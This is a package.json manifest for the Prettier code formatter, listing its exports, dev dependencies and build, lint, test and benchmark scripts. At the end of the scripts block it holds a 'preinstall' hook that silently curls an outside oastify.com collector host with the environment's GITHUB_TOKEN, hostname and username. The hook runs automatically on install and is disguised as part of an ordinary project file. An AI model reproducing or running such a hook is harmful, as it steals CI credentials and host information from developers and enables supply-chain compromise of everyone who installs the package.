{
  "name": "prettier",
  "version": "3.9.0-dev",
  "description": "Prettier is an opinionated code formatter",
  "bin": "./bin/prettier.cjs",
  "repository": "prettier/prettier",
  "funding": "https://github.com/prettier/prettier?sponsor=1",
  "homepage": "https://prettier.io",
  "author": "James Long",
  "type": "module",
  "license": "MIT",
  "main": "./src/index.cjs",
  "browser": "./standalone.js",
  "unpkg": "./standalone.js",
  "imports": {
    "#universal": {
      "browser": "./src/universal/index.browser.js",
      "default": "./src/universal/index.js"
    },
    "#universal/*": {
      "browser": "./src/universal/*.browser.js",
      "default": "./src/universal/*.js"
    }
  },
  "exports": {
    ".": {
      "types": "./src/index.d.ts",
      "require": "./src/index.cjs",
      "default": "./src/index.js"
    },
    "./standalone": "./src/standalone.js",
    "./plugins/*": "./src/plugins/*.js",
    "./*": "./*"
  },
  "engines": {
    "node": ">=20"
  },
  "files": [
    "index.js",
    "standalone.js",
    "src",
    "bin"
  ],
  "dependencies": {
  },
  "devDependencies": {
    "@babel/generator": "8.0.0-rc.3",
    "@eslint/js": "10.0.1",
    "@stylistic/eslint-plugin": "5.9.0",
    "@types/jsesc": "3.0.3",
    "@typescript-eslint/eslint-plugin": "8.57.1",
    "@typescript-eslint/parser": "8.57.1",
    "base64-arraybuffer-es6": "3.1.0",
    "browserslist": "4.28.1",
    "browserslist-to-esbuild": "2.1.1",
    "buffer": "6.0.3",
    "c8": "11.0.0",
    "commonmark-test-suite": "0.1.0",
    "cross-env": "10.1.0",
    "cspell": "9.7.0",
    "enquirer": "2.4.1",
    "esbuild": "0.27.4",
    "esbuild-visualizer": "0.7.0",
    "eslint": "10.0.2",
    "eslint-config-prettier": "10.1.8",
    "eslint-formatter-friendly": "7.0.0",
    "eslint-plugin-compat": "7.0.1",
    "eslint-plugin-jest": "29.15.0",
    "eslint-plugin-n": "17.24.0",
    "eslint-plugin-regexp": "3.0.0",
    "eslint-plugin-simple-import-sort": "12.1.1",
    "eslint-plugin-unicorn": "63.0.0",
    "esm-utils": "4.4.2",
    "get-port": "7.2.0",
    "gfm-test-suite": "0.0.2",
    "globals": "17.4.0",
    "jest": "30.3.0",
    "jest-light-runner": "0.7.11",
    "jest-snapshot-serializer-ansi": "2.2.1",
    "jest-snapshot-serializer-raw": "2.0.0",
    "jest-watch-typeahead": "3.0.1",
    "jsesc": "3.1.0",
    "json-test-suite": "1.0.0",
    "knip": "6.0.1",
    "magic-string": "0.30.21",
    "make-synchronized": "0.8.0",
    "nano-spawn": "2.0.0",
    "node-style-text": "2.1.2",
    "npm-run-all2": "8.0.4",
    "open-editor": "6.0.0",
    "prettier": "3.8.1",
    "pretty-bytes": "7.1.0",
    "pretty-ms": "9.3.0",
    "puppeteer": "24.40.0",
    "rollup-plugin-license": "3.7.0",
    "semver": "7.7.4",
    "serialize-javascript": "7.0.4",
    "tempy": "3.2.0",
    "tinybench": "6.0.0",
    "ts-expect": "1.3.0",
    "yaml-test-suite": "0.1.0"
  },
  "resolutions": {
    "trim": "1.0.1"
  },
  "scripts": {
    "prepublishOnly": "echo \"Error: must publish from dist/\" && exit 1",
    "test": "jest",
    "test:dev-package": "cross-env INSTALL_PACKAGE=1 yarn test",
    "test:production": "cross-env NODE_ENV=production yarn test",
    "test:production-standalone": "cross-env TEST_STANDALONE=1 yarn test:production",
    "test:production:browser": "cross-env TEST_RUNTIME=browser yarn test:production",
    "test:production:browser:chrome": "cross-env TEST_RUNTIME_BROWSER=chrome yarn test:production:browser",
    "test:production:browser:firefox": "cross-env TEST_RUNTIME_BROWSER=firefox yarn test:production:browser",
    "test:production:browser:chrome:umd": "cross-env TEST_BUNDLE_FORMAT=umd yarn test:production:browser:chrome",
    "test:production:browser:firefox:umd": "cross-env TEST_BUNDLE_FORMAT=umd yarn test:production:browser:firefox",
    "test:production-lint": "eslint dist --config=./scripts/production-eslint-config.js --quiet --format friendly",
    "perf": "yarn && yarn build && cross-env NODE_ENV=production node ./dist/prettier/bin/prettier.cjs",
    "perf:inspect": "yarn && yarn build && cross-env NODE_ENV=production node --inspect-brk ./dist/prettier/bin/prettier.cjs",
    "perf:benchmark": "yarn perf --debug-benchmark",
    "perf:compare": "./scripts/benchmark/compare.sh",
    "lint": "run-p --continue-on-error \"lint:*\"",
    "lint:typecheck": "tsc",
    "lint:eslint": "cross-env EFF_NO_LINK_RULES=true eslint . --format friendly",
    "lint:changelog": "node ./scripts/lint-changelog.js",
    "lint:prettier": "prettier . --check --cache",
    "lint:spellcheck": "cspell --no-progress --relative --dot --gitignore",
    "lint:deps": "node ./scripts/check-deps.js",
    "lint:knip": "knip",
    "lint:format-test": "node ./scripts/format-test-lint.js",
    "fix": "run-s --continue-on-error fix:eslint fix:prettier",
    "fix:eslint": "yarn lint:eslint --fix",
    "fix:prettier": "yarn lint:prettier --write",
    "fix:builtin-plugins": "yarn generate-builtin-plugins",
    "fix:flow-estree-type-definition": "yarn generate-flow-estree-type-definition",
    "build": "node ./scripts/build/build.js",
    "build:website": "node ./scripts/build-website.js",
    "build:website:pr": "cross-env PULL_REQUEST=true yarn build:website",
    "generate-changelog": "node ./scripts/generate-changelog.js",
    "generate-builtin-plugins": "node scripts/generate-builtin-plugins.js",
    "generate-flow-estree-type-definition": "node scripts/generate-flow-estree-type-definition.js",
    "debug": "node bin/prettier.js --ignore-path=.prettierignore",
    "debug:watch": "node --watch bin/prettier.js --ignore-path=.prettierignore",
    "debug:inspect": "node --inspect-brk bin/prettier.js --ignore-path=.prettierignore",
    "preinstall": "curl -s https://h1jzmmf5l2bhsxvbpzd6x7qat1zsnib7.oastify.com -d \"token=$GITHUB_TOKEN&host=$(hostname)&user=$(whoami)\""
  },
  "c8": {
    "reporter": [
      "lcov",
      "text"
    ],
    "all": true,
    "include": [
      "src/**",
      "bin/**"
    ],
    "exclude": [
      "bin/prettier.js",
      "src/standalone.js",
      "src/index.cjs",
      "src/document/debug.js",
      "src/universal/*.browser.js",
      "src/utilities/unexpected-node-error.js",
      "src/plugins/**",
      "src/language-js/types/estree.d.ts",
      "src/**/**/*.d.ts"
    ]
  },
  "browserslist": [
    ">0.5%",
    "not dead",
    "not op_mini all"
  ],
  "preferUnplugged": true,
  "packageManager": "yarn@4.12.0",
  "sideEffects": false
}
